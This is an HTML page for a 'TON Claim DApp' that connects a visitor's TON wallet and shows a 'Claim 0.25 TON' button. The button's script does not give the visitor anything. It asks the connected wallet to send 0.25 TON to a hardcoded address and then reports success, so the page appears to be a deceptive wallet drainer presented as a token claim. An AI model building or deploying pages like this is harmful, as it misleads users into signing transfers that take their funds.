<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Claim DApp</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #f0f2f5;
        }
        .container {
            text-align: center;
            padding: 20px;
        }
        button {
            padding: 10px 20px;
            margin: 10px;
            border: none;
            border-radius: 5px;
            background-color: #0088cc;
            color: white;
            cursor: pointer;
        }
        button:disabled {
            background-color: #ccc;
        }
    </style>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
</head>
<body>
    <div class="container">
        <h1>TON Claim DApp</h1>
        <div id="wallet-section">
            <button onclick="connectWallet()" id="connect-button">Connect Wallet</button>
            <div id="wallet-address" style="display:none;"></div>
        </div>
        <div id="claim-section" style="display:none;">
            <button onclick="claimTokens()" id="claim-button">Claim 0.25 TON</button>
        </div>
    </div>

    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://hasan199191.github.io/my-telegram-bot/tonconnect-manifest.json',
            buttonRootId: 'connect-button'
        });

        async function connectWallet() {
            try {
                await tonConnectUI.disconnect();
                
                const wallet = await tonConnectUI.connectWallet();
                if (wallet) {
                    document.getElementById('connect-button').style.display = 'none';
                    document.getElementById('wallet-address').style.display = 'block';
                    document.getElementById('wallet-address').innerHTML = `Connected: ${wallet.account.address}`;
                    document.getElementById('claim-section').style.display = 'block';
                }
            } catch (error) {
                console.error('Connection error:', error);
                alert('Connection error: ' + error.message);
            }
        }

        async function claimTokens() {
            try {
                const transaction = {
                    messages: [
                        {
                            address: "EQCBlhS0J_g7MZDJkBIb1mczcvbTmuiHXbi5smTxFWukVF5n",
                            amount: "250000000", // 0.25 TON
                        }
                    ],
                    validUntil: Date.now() + 300000 // 5 minutes
                };

                document.getElementById('claim-button').disabled = true;
                const result = await tonConnectUI.sendTransaction(transaction);
                alert('Transaction successful! Hash: ' + result.boc);
            } catch (error) {
                console.error('Transaction error:', error);
                alert('Transaction failed: ' + error.message);
            } finally {
                document.getElementById('claim-button').disabled = false;
            }
        }

        // Handle wallet connection status
        tonConnectUI.onStatusChange(wallet => {
            if (!wallet) {
                document.getElementById('connect-button').style.display = 'block';
                document.getElementById('wallet-address').style.display = 'none';
                document.getElementById('claim-section').style.display = 'none';
            }
        });
    </script>
</body>
</html>
